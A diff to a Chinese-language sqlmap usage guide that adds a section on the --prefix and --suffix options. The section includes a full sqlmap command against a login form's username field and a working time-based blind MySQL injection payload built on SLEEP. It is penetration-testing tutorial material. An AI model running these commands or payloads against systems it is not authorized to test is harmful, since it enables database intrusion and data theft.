@@ -140,7 +140,7 @@ id=1
 ```
 设置爬取深度.
 
-```shell
+```
 req1.txt中的URL为:
 http://192.168.0.1/web/
 
@@ -175,6 +175,26 @@ python sqlmap.py -u xxx.com/index.php/Index/view/id/40*.html --dbs
 在一次成功获取数据后,想再次获取最新的数据,就可以用这个参数.
 
 提示:仅会在数据文件夹中删除 这个文件夹 /xx.com/ 中的几乎所有信息,除了已经获取并保存为`results-xxxx.csv`的文件,它们会被重命名为`results-xxxx.csv1`
+
+
+#### 常用参数 - payload前缀与后缀
+
+某个网站登录处,手工测试存在SQL注入,但sqlmap默认无法发现漏洞.
+
+只有根据手工测试结果(见Payload),使用参数 `--prefix` 和 `--suffix` 给Payload加上前缀和后缀,才能让sqlmap发现SQL注入漏洞,便于进行自动化.
+
+```
+python sqlmap.py -r req1.txt --random-agent --dbms=mysql --time-sec 10 -p username -v3 --tech=T --prefix="'" --suffix="--'"  --tamper=between --dbs
+
+---
+Parameter: username (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=admin' AND (SELECT 5105 FROM (SELECT(SLEEP(10)))txIo)--'
+    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
+---
+```
+
 
 #### 常用参数 - 基本信息获取
 
